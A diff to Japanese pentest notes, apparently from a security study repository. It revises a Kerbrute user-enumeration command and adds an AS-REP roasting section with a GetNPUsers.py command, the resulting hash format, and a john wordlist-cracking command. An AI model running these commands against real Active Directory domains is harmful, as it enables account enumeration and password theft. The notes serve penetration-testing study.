@@ -10,7 +10,7 @@ https://github.com/ropnop/kebrute
 Kerbruteの『userenum』コマンドを使用する。
 
 ```
-$ kerbrute userenum -d example.com user_list.txt
+$ kerbrute userenum -d [domain name] --dc [dc name] [user_list]
 
 Usage:
   Kerbrute userenum [flags] <username_wordlist>
@@ -62,4 +62,20 @@ sequenceDiagram
     Client->>+KDC: KRB_AS_REQ
     Note over Client,KDC: Empty
   KDC-->>-Client: KRB_AS_REP
+```
+
+### ASREPRoarstableアカウントを利用したTGTの取得
+```
+$ GetNPUsers.py [domain name/user name] -no-pass
+```
+
+成功すると以下の形式でhashが出力される。
+```
+$krb5asrep$23$user@domain:hash
+```
+
+johnで解析
+
+```
+$ john hash.txt --wordlist=password_list.txt
 ```
